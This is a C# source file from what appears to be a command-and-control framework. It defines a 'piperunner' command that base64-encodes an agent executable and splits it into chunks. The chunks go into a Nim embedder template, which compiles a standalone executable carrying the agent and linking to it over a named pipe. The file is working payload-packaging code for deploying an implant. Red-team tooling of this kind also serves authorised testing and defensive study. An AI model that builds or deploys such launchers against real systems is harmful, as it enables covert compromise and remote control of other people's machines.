﻿using Commander.Executor;
using System;
using System.CommandLine;
using System.CommandLine.NamingConventionBinder;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using Commander.Internal;
using System.IO;
using Commander.Models;

namespace Commander.Commands.Laucher
{
    public class BuildPipeRunnerCommandCommandOptions
    {
        public string fileName { get; set; }

        public bool debug { get; set; }

        public bool x86 { get; set; }

        public bool verbose { get; set; }
    }
    public class BuildPipeRunnerCommand : EnhancedCommand<BuildPipeRunnerCommandCommandOptions>
    {
        public override string Category => CommandCategory.Launcher;
        public override string Description => "Create a file embedding the piped agent";
        public override string Name => "piperunner";

        public override ExecutorMode AvaliableIn => ExecutorMode.Launcher;

        public override RootCommand Command => new RootCommand(this.Description)
        {
            new Option<string>(new[] { "--fileName", "-f" }, () => "piperunner" ,"Nome of the file to be crafted"),
            new Option(new[] { "--debug", "-d" }, "Keep debugging info when building"),
            new Option(new[] { "--x86", "-x86" }, "Generate a x86 architecture executable"),
            new Option(new[] { "--verbose", "-v" }, "Show details of the command execution."),
        };

        protected override async Task<bool> HandleCommand(CommandContext<BuildPipeRunnerCommandCommandOptions> context)
        {
            string id = ShortGuid.NewGuid();
            string dotnetparms = $"pipe:{id}";


            if (context.Options.fileName == "piperunner")
                context.Options.fileName += "_" + id;

            string outFile = context.Options.fileName;
            if (!Path.GetExtension(outFile).Equals(".exe", StringComparison.OrdinalIgnoreCase))
                outFile += ".exe";
            string outPath = Path.Combine("/tmp", outFile);



            var fileName = "Agent";
            if (context.Options.x86)
                fileName += "-x86";
            fileName += ".exe";

            var srcDir = BuildHelper.SourceFolder;
            string agentb64 = BuildHelper.GenerateB64(Path.Combine(srcDir, fileName));

            string nimSourceCode = string.Empty;
            using (var nimReader = new StreamReader(Path.Combine(srcDir, "embedder.nim")))
            {
                nimSourceCode = nimReader.ReadToEnd();
            }

            var payload = new StringBuilder();
            foreach (var chunk in BuildHelper.SplitIntoChunks(agentb64, 150))
            {
                payload.Append("b64 = b64 & \"");
                payload.Append(chunk);
                payload.Append("\"");
                payload.Append(Environment.NewLine);
            }

            var nimFile = "tmp"+ id;
            nimSourceCode = nimSourceCode.Replace("[[PAYLOAD]]", payload.ToString());


            using (var writer = new StreamWriter(Path.Combine(srcDir, nimFile + ".nim")))
            {
                writer.WriteLine(nimSourceCode);
            }


            var parms = BuildHelper.ComputeNimBuildParameters(nimFile, outPath, context.Options.debug, false);

            if (context.Options.x86)
                parms.Insert(3, $"--cpu:i386");
            else
                parms.Insert(3, $"--cpu:amd64");
            parms.Insert(4, $"-d:DotNetParams={dotnetparms}");



            context.Terminal.WriteLine($"[>] Generating PipeRunner...");

            if (context.Options.verbose)
                context.Terminal.WriteLine($"[>] Executing: nim {string.Join(" ", parms)}");
            var executionResult = BuildHelper.NimBuild(parms);

            if (context.Options.verbose)
                context.Terminal.WriteLine(executionResult.Out);

            File.Delete(Path.Combine(srcDir, nimFile + ".nim"));

            if (executionResult.Result != 0)
            {
                context.Terminal.WriteError($"[X] Build Failed!");
                return false;
            }

            context.Terminal.WriteSuccess($"[*] Build succeed.");
            context.Terminal.WriteInfo($"PipeRunner can be found at {outPath}");
            context.Terminal.WriteInfo($"/!\\ The PipeRunner Id is {id}, it should be use for linking once launched.");

            return true;
        }
    }

}